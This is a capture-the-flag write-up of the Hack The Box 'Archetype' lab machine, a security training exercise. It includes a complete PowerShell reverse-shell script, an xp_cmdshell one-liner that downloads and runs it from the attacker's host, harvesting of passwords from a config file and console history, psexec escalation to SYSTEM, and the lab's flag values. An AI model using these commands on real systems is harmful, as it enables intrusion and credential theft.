# Hack The Box | Archetype
###### Writeup by. Jessi

## Enumeration
### Nmap Scan
I started with an nmap scan against the target.  
**Target:** 10.10.10.27
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ nmap -sC -sV -T4 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 19:40 EST
Nmap scan report for 10.10.10.27
Host is up (0.025s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-01-07T00:08:48
|_Not valid after:  2051-01-07T00:08:48
|_ssl-date: 2021-01-07T01:01:15+00:00; +20m03s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h56m03s, deviation: 3h34m40s, median: 20m02s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-06T17:01:07-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-07T01:01:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.14 seconds
~~~

### Open Ports/Services Found
445/tcp - SMB  
1433/tcp - SQL

### SMB
I attempted to access SMB with anonymous user access.
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ smbclient -N -L \\\\10.10.10.27\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
~~~

The **backups** share looked interesting, so I decided to take a look inside. Inside of the share, I found a file called **[prod.dtsConfig](https://github.com/jessisec/ctf-writeups/blob/main/HackTheBox/Archetype/prod.dtsConfig)**, so I decided to download it for further inspection.
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8259126 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
~~~

Inside of the file, I found some credentials.
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
~~~
#### Found Credentials
Username: ARCHETYPE\sql_svc  
Password: M3g4c0rp123
  
  
  
## Foothold
### SQL
Using the credentials I found in the config earlier, I can use **[Impacket's](https://github.com/SecureAuthCorp/impacket)** **mssqlclient.py** to access SQL on the target.
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
~~~
### Permission Recon
Using SQL, I was able to determine if our account had sysadmin permissions.
~~~Bash
SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
              

-----------   

          1 
~~~
The respone value of **1** means we have sysadmin permission, which is great for us.
### RCE xp_cmdshell
By inputting the following commands, we are able to gain remote code execution on the target and view which user we are logged in as afterwards.
~~~Bash
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
~~~
The **whoami** command responsed with **archetype\sql_svc** which is the expected response in this case - this confirms our RCE works.

### PowerShell Reverse Shell
Using **PowerShell** we can mock up a quick file that'll get us connected with a **netcat** listener. I named my file [**shell.ps1**](https://github.com/jessisec/ctf-writeups/blob/main/HackTheBox/Archetype/shell.ps1). With the file created, I just needed to transfer it to our target.  
**Shell.ps1**  
~~~Powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.30",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "# ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};$client.Close()
~~~
I used **Python's** http.server module to accomplish this.
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


~~~
Afterwards, I setup a **netcat** listener on port 443 and used UFW to allow the call backs on port 80 and 443 to our machine.
~~~Bash
┌──(jessi㉿teatimesec)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...


~~~
Finally, all I had to do was initiate the download from the target and execute it with **PowerShell**.
~~~Bash
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.30/shell.ps1\");"

~~~

We immediately get a shell as the sql_svc user.
~~~Bash
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.27] 49711

# whoami
archetype\sql_svc
# 
~~~
## PrivEsc
### Checking Console History
Since the sql_svc account is both a service account and a normal user account, it's likely an administrator has logged in to the server with the account before and possibly ran commands as the user. I can access the console history for the user and inspect for anything useful.
~~~Bash
# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
# 
~~~
The latest command in the history reveals credentials for the **administrator** account.
#### Found Credentials
Username: administrator  
Password: MEGACORP_4dm1n!!

### psexec.py
Using the administrator credentials, I can use Impacket's **psexec.py** to escalate privileges to SYSTEM - the equivalent of root on Windows.
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
└─$ psexec.py administrator@10.10.10.27
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file hTKJRoBd.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service ZvLh on 10.10.10.27.....
[*] Starting service ZvLh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
~~~
From here, I was able to capture both the user.txt and root.txt flags.
##### user.txt  
Located in C:\Users\sql_svc\Desktop  
**3e7b102e78218e935bf3f4951fec21a3**  
##### root.txt  
Located in C:\Users\Administrator\Desktop  
**b91ccec3305e98240082d4474b848528**
